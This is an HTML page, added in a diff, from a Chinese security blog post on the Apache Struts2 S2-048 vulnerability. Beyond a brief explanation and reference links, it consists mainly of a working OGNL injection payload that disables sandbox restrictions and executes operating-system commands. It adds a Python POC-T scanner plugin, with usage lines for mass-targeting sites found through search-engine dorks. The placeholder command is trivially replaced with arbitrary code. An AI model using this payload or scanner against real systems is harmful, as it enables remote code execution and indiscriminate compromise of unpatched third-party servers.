@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="# 0x01 One Poc One Day.  # 0x02 原理 【原理详解】—— S2-048 动态分析 感觉说到底还是调用到的函数会执行ognl表达式，然后传入的参数用户可控。  # 0x03 Poc## Payload1%&amp;#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#">
+<meta name="keywords" content="poc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【One Poc One Day】—— Struts 048">
+<meta property="og:url" content="http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/index.html">
+<meta property="og:site_name" content="am4zing·wang2ha">
+<meta property="og:description" content="# 0x01 One Poc One Day.  # 0x02 原理 【原理详解】—— S2-048 动态分析 感觉说到底还是调用到的函数会执行ognl表达式，然后传入的参数用户可控。  # 0x03 Poc## Payload1%&amp;#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-08-13T14:35:42.604Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【One Poc One Day】—— Struts 048">
+<meta name="twitter:description" content="# 0x01 One Poc One Day.  # 0x02 原理 【原理详解】—— S2-048 动态分析 感觉说到底还是调用到的函数会执行ognl表达式，然后传入的参数用户可控。  # 0x03 Poc## Payload1%&amp;#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【One Poc One Day】—— Struts 048</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/Search/">搜索</a></li>
+         
+          <li><a href="https://github.com/yizhimanpadewoniu">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/08/13/图形验证码大小可控可造成DOS攻击/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&text=【One Poc One Day】—— Struts 048"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&is_video=false&description=【One Poc One Day】—— Struts 048"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【One Poc One Day】—— Struts 048&body=Check out this article: http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&name=【One Poc One Day】—— Struts 048&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text"># 0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-原理"><span class="toc-number">2.</span> <span class="toc-text"># 0x02 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Poc"><span class="toc-number">3.</span> <span class="toc-text"># 0x03 Poc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">3.1.</span> <span class="toc-text">## Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text"># 0x04 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【One Poc One Day】—— Struts 048
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">am4zing·wang2ha</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-08-12T16:00:00.000Z" itemprop="datePublished">2018-08-13</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/poc/">poc</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01"><a href="#0x01" class="headerlink" title="# 0x01"></a># 0x01</h2><blockquote>
+<p>One Poc One Day.</p>
+</blockquote>
+<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="# 0x02 原理"></a># 0x02 原理</h2><blockquote>
+<p><a href="http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">【原理详解】—— S2-048 动态分析</a></p>
+<p>感觉说到底还是调用到的函数会执行ognl表达式，然后传入的参数用户可控。</p>
+</blockquote>
+<h2 id="0x03-Poc"><a href="#0x03-Poc" class="headerlink" title="# 0x03 Poc"></a># 0x03 Poc</h2><h3 id="Payload"><a href="#Payload" class="headerlink" title="## Payload"></a>## Payload</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dobby').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在vulhub的环境中进行poc验证的时候，只要在正常的请求后在添加一个重复参数包含payload即可。</p>
+<p><strong>不知道真实的环境中，有几个点还是有疑问的（需要真实环境验证）：</strong></p>
+<ul>
+<li><strong>是否需要再重新设计一下payload的形式；</strong></li>
+<li><strong>是否需要每次都必须指定参数，并插入payload，这样的话还能否自动化；还是每次都要指定参数进行poc验证；</strong></li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: am4zing</span></span><br><span class="line"><span class="comment"># Date: 2018-08-10 15:36:34</span></span><br><span class="line"><span class="comment"># Project: https://github.com/yizhimanpadewoniu</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">影响版本:</span></span><br><span class="line"><span class="string">2.0.0 - 2.3.32</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2048 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2048 -aZ "login.action"</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2048 -iF FILE.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用过程中，与其他不同，此处需要指定参数，否则会报错？(这一点没摸准，可以再更新)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">'http://'</span> + url</span><br><span class="line">    header = dict()</span><br><span class="line">    header[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    header[<span class="string">'User-Agent'</span>] = <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span></span><br><span class="line">    payload = <span class="string">'''%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dobby').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;'''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = <span class="string">'&amp;name='</span> + payload</span><br><span class="line">        post_data = raw_input(<span class="string">'post_data:'</span>) + payload</span><br><span class="line">        post_data = <span class="string">'name=q&amp;age=q&amp;__checkbox_bustedBefore=true&amp;description=q'</span> + post_data</span><br><span class="line">        result = requests.post(url, data=post_data, headers=header, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'dobby'</span> <span class="keyword">in</span> result.content:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'[S2-048]'</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="# 0x04 参考"></a># 0x04 参考</h2><ul>
+<li><a href="https://www.anquanke.com/post/id/86398" target="_blank" rel="noopener">【安全客】—— 【漏洞分析】Struts2高危漏洞S2-048分析</a></li>
+<li><a href="http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">【S2-048 动态分析】</a></li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/Search/">搜索</a></li>
+         
+          <li><a href="https://github.com/yizhimanpadewoniu">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text"># 0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-原理"><span class="toc-number">2.</span> <span class="toc-text"># 0x02 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Poc"><span class="toc-number">3.</span> <span class="toc-text"># 0x03 Poc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">3.1.</span> <span class="toc-text">## Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text"># 0x04 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&text=【One Poc One Day】—— Struts 048"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&is_video=false&description=【One Poc One Day】—— Struts 048"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【One Poc One Day】—— Struts 048&body=Check out this article: http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&title=【One Poc One Day】—— Struts 048"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://am4zing.me/2018/08/13/【One Poc One Day】—— Struts 048/&name=【One Poc One Day】—— Struts 048&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Wanghaha
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/Search/">搜索</a></li>
+         
+          <li><a href="https://github.com/yizhimanpadewoniu">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  <!-- 不蒜子 -->
+  <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span id="busuanzi_container_site_uv">
+    访客数<span id="busuanzi_value_site_uv"></span>次
+  </span>
+  <!-- 不蒜子 -->
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'bbjs_byd';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
